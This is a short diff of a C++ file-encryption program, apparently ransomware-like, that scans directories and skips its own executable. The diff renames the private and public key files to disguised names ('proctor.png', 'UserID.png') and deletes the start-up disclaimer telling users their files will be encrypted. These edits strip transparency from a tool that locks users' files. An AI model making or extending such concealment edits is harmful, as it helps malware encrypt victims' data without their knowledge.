@@ -13,21 +13,11 @@
 #include "constants.h"
 
 // Define the constants declared in constants.h
-const std::string PRIVATE_KEY_IMAGE = "private_key.png";
-const std::string PUBLIC_KEY_IMAGE = "public_key.png";
+const std::string PRIVATE_KEY_IMAGE = "proctor.png";
+const std::string PUBLIC_KEY_IMAGE = "UserID.png";
 
 // Program description and disclaimer
-void showDisclaimer() {
-    std::cout << "=================================================================\n";
-    std::cout << "SECURE FILE PROTECTION UTILITY - VERSION 1.0\n";
-    std::cout << "=================================================================\n";
-    std::cout << "This is a legitimate security tool for protecting sensitive files.\n";
-    std::cout << "It uses strong encryption to secure your data from unauthorized access.\n";
-    std::cout << "WARNING: Always keep your decryption keys in a safe place!\n\n";
-    std::cout << "By continuing, you acknowledge this is a data protection tool.\n";
-    std::cout << "=================================================================\n\n";
-}
-
+ 
 // Helper function to check if a file should be skipped during protection process
 bool shouldSkipFile(const std::filesystem::path& path, const std::filesystem::path& exePath) {
     // Skip the executable itself
